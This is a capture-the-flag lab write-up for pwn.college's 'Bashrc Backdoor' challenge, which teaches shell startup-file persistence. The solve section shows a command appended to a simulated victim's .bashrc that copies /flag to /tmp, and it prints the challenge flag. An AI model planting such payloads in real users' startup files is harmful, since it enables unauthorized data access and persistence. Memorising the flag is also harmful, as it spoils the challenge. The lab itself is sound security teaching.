# Linux Luminarium
# Module 15: Silly Sehnanigans

## Bashrc Backdoor
When your shell starts up, it looks for .bashrc file in your home directory and executes it as a startup script. You can customize your /home/hacker/.bashrc with useful things, such as setting environment variables, tweaking your shell configuration, and so on.

You can also use it for evil! An unwitting victim's .bashrc is a common target for shenanigans. Imagine sneaking onto your friend's computer and adding a echo "Hackers were here!" at the end of their .bashrc. That's funny, but the same capability can be used for much more nefarious purposes. Malicious software, for example, often targets startup scripts such as .bashrc to maintain persistence into the future!

In this challenge, we'll pretend that you've broken into a victim user's machine! That user is named zardus, with a home directory of /home/zardus. You, as the hacker user, have write access to his .bashrc, and zardus has read-access to /flag. The victim is simulated by the script /challenge/victim, and you can launch this script at any time to observe the victim logging into the computer. Can you get the flag?

HINT: Like the scripts you explored in Chaining Commands, the .bashrc script is just a shell script. Adding a new line with a command on it (e.g., echo Hello Hackers) will get that command executed, so all you really need to think about is what command will get you the flag!

NOTE: The victim's /home/zardus/.bashrc will have a lot of stuff already in it: the shell's startup is a complex affair. Don't panic --- just add your payload to the end and hope for the best!

HINT: Need to poke around as zardus to debug your solution? In Privileged Mode, you can use sudo su --login zardus to drop into a Zardus session!

### Solve
**Flag:** `pwn.college{w2WF8dlH8qhVuVgR58SyKeUvWF0.0VMzEzNxwiNyUDN0EzW}`

This challenge demonstrated how shell startup files can be abused for persistence. The victim user, zardus, automatically executed /home/zardus/.bashrc whenever a login shell was started. A malicious command was appended to the end of the victim's .bashrc that copied the contents of /flag into a file accessible by the hacker user. When /challenge/victim simulated the victim logging in, the modified .bashrc executed automatically with the victim's permissions. Since zardus could read /flag, the flag was copied to /tmp/flag, where it could then be read normally.

```bash
hacker@shenanigans~bashrc-backdoor:~$ echo 'cat /flag > /tmp/flag' >> /home/zardus/.bashrc
hacker@shenanigans~bashrc-backdoor:~$ /challenge/victim
Username: zardus
zardus@shenanigans~bashrc-backdoor:~$ ***********
-bash: 2050329729: command not found
zardus@shenanigans~bashrc-backdoor:~$ exit

logout
hacker@shenanigans~bashrc-backdoor:~$ cat /tmp/flag
pwn.college{w2WF8dlH8qhVuVgR58SyKeUvWF0.0VMzEzNxwiNyUDN0EzW}
```

### New Learnings
Learned that .bashrc is a shell startup script that executes automatically whenever a user starts a login shell. Reinforced how startup files can be abused to achieve persistence by automatically running commands in the future. Also gained experience modifying another user's shell configuration and observed how commands placed in .bashrc execute with the permissions of the user who launches the shell.